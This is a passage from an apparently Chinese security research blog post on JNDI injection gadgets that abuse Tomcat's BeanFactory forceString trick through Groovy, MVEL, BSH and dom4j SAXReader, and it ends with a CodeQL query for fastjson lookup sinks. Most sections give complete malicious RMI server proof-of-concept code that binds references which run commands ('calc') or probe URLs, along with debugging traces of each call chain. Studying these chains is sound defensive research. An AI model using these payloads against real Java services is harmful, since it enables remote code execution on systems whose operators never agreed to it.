id="RCE-addClasspath-amp-amp-loadClass"><a href="#RCE-addClasspath-amp-amp-loadClass" class="headerlink" title="RCE:addClasspath&amp;&amp;loadClass"></a>RCE:addClasspath&amp;&amp;loadClass</h4><p><img src="https://s2.loli.net/2022/07/11/NCwU2KzqLPeSmvD.png" alt="image-20220628193424951"></p><h4 id="RCE-execute"><a href="#RCE-execute" class="headerlink" title="RCE:execute"></a>RCE:execute</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.codehaus.groovy.runtime.ProcessGroovyMethods"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=execute"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/11/ao1AEuk7OHWMN2d.png" alt="image-20220629093146483"></p><h4 id="RCE-me"><a href="#RCE-me" class="headerlink" title="RCE:me"></a>RCE:me</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.util.Eval"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=me"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"\"calc\".execute()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/11/MqjK8JXZO3gV2fi.png" alt="image-20220629101318838"></p><p>这个方法名如此人畜无害，单从方法名来看很难联想到能RCE。我们调试一下：</p><p>进入<code>Eval#me</code>中，此时该方法仅有的String参数为我们传入的<code>"calc.execute()"</code></p><p>调用下面的<code>me</code>，将前两个参数置为<code>null</code>，实例化一个<code>GroovyShell</code>–&gt;<code>sh</code>，进入<code>sh.evaluate</code>中</p><p><img src="/codeql_for_java.assets/image-20220629114200937.png" alt="image-20220629114200937"></p><p>接着跟入<code>sh.evaluate</code>：</p><p>一系列调用后指定<code>codeBase</code>为<code>/groovy/shell</code>，包装好后实例化为<code>gcs</code></p><p><img src="https://s2.loli.net/2022/07/11/m7pgvBoAkxetqCE.png" alt="image-20220629115450341"></p><p>跟入<code>this.evaluate(gcs)</code>：</p><p><img src="https://s2.loli.net/2022/07/11/d3M6ksNE1bQawG5.png" alt="image-20220629135440322"></p><p><code>parse</code>方法处理后调用<code>script.run();</code>运行groovy脚本。最终也是走到了<code>execute</code>，也就是之前提过的利用方式。</p><h4 id="RCE-parse"><a href="#RCE-parse" class="headerlink" title="RCE:parse"></a>RCE:parse</h4><p>在这里会调用<code>parseClass</code>，所以poc和<code>parseClass</code>利用一样。之前几步的处理过程很好理解此处就不多水字了。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.lang.GroovyShell"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=parse"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"calc\")\n})\ndef m1yuu\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/07/11/cmyLEuiC5af71Qr.png" alt="image-20220629163409700"></p><h4 id="RCE-parseClass"><a href="#RCE-parseClass" class="headerlink" title="RCE:parseClass"></a>RCE:parseClass</h4><p>这个网上很多文章都提到了，就不再赘述。</p><h4 id="URL探测-getText"><a href="#URL探测-getText" class="headerlink" title="URL探测:getText"></a>URL探测:getText</h4><p><img src="https://s2.loli.net/2022/07/11/On2VSphFBEC8rjZ.png" alt="image-20220629091224537"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.ui.GroovyMain"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=getText"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"http://127.0.0.1:8000"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用python起个简易httpserver：</p><p><img src="https://s2.loli.net/2022/07/11/eS2fKXao6FkvcsU.png" alt="image-20220629091810108"></p><h3 id="MVEL"><a href="#MVEL" class="headerlink" title="MVEL"></a>MVEL</h3><h4 id="RCE-exec"><a href="#RCE-exec" class="headerlink" title="RCE:exec"></a>RCE:exec</h4><p>此处利用点浅蓝师傅已经找到了，这里复现一下：</p><p><img src="/codeql_for_java.assets/image-20220630141615337.png" alt="image-20220630141615337"></p><p><img src="https://s2.loli.net/2022/07/11/tZj3zhkxP6OAGuo.png" alt="image-20220630144501270"></p><p>传入的<code>command</code>参数是我们可控的点，这里处理完换行之后赋值给<code>c</code>，<code>this.inBuffer.append(c)</code>将c压入<code>inBuffer</code>中，执行<code>_exec()</code>,跟入：</p><p><img src="https://s2.loli.net/2022/07/11/I5luiJNz93Leo82.png" alt="image-20220630145551556"></p><p>处理<code>inBuffer</code>内容，以空格分离为数组之后将后面的参数赋值给<code>passParameters</code>，调用<code>((Command)this.commands.get(inTokens[0])).execute(this, passParameters);</code>，我们继续跟入<code>execute</code>，走到<code>MVEL.eval</code>，这里new一个<code>MVELInterpretedRuntime</code>，调用<code>parse</code>方法：</p><p><img src="https://s2.loli.net/2022/07/11/dCxwoPO1Ni6jTRp.png" alt="image-20220630152653247"></p><p>接着调用<code>parseAndExecuteInterpreted</code>，走到<code>getReducedValue</code>中发现调用了<code>PropertyAccessor#get</code>,走到这里调用链就比较清晰了。最后在<code>getMethod</code>方法中触发：</p><p><img src="https://s2.loli.net/2022/07/11/kc1MRi3fCvmNKXD.png" alt="image-20220630153359771"></p><h3 id="BSH"><a href="#BSH" class="headerlink" title="BSH"></a>BSH</h3><h4 id="没啥意义的RCE"><a href="#没啥意义的RCE" class="headerlink" title="没啥意义的RCE:"></a>没啥意义的RCE:</h4><p><img src="https://s2.loli.net/2022/07/11/RsWzVCZT58KMyGh.png" alt="image-20220704112157355"></p><p>这个只能加载本地的恶意类，所以没啥意义。</p><p><img src="https://s2.loli.net/2022/07/11/6DtyHLZCfMlJOhb.png" alt="image-20220704112301104"></p><h4 id="RCE-eval"><a href="#RCE-eval" class="headerlink" title="RCE:eval"></a>RCE:eval</h4><p>这个利用方式已经被藏青@雁行安全团队找出来了。</p><h3 id="SAXReader"><a href="#SAXReader" class="headerlink" title="SAXReader"></a>SAXReader</h3><h4 id="URL探测-read"><a href="#URL探测-read" class="headerlink" title="URL探测:read"></a>URL探测:read</h4><p>并没有找到可以rce的点，不过其中的read方法可控，可以做url探测：</p><p><img src="https://s2.loli.net/2022/07/11/2gAl5WjQtp9yunr.png" alt="image-20220704165954276"></p><p>poc:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.dom4j.io.SAXReader"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=read"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"seturl"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为控制的是<code>read</code>方法，各种尝试之后也没能打到XML解析（太菜了），只能做个URL探测玩玩。</p><h3 id="jdk-原生"><a href="#jdk-原生" class="headerlink" title="jdk 原生"></a>jdk 原生</h3><h2 id="fastjson-with-codeql"><a href="#fastjson-with-codeql" class="headerlink" title="fastjson with codeql"></a>fastjson with codeql</h2><p>此漏洞的sink是jndi注入点，所以我们需要找到调用了lookup方法的地方。同时，fastjson漏洞的利用方式是控制getter或者setter。那么我们的限制条件就如下：</p><ul><li>调用了lookup方法</li><li>在getter或者setter的递归中满足上条件</li></ul><p>构造ql语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> javaclass LookupMethod extends <span class="token keyword">Call</span> {  LookupMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> {    this<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASupertype<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span> <span class="token operator">and</span>    this<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>  }}class GetterCallable extends Callable {  GetterCallable<span class="token punctuation">(</span><span class="token punctuation">)</span> {    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"get%"</span><span class="token punctuation">)</span> <span class="token operator">and</span>    hasNoParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token 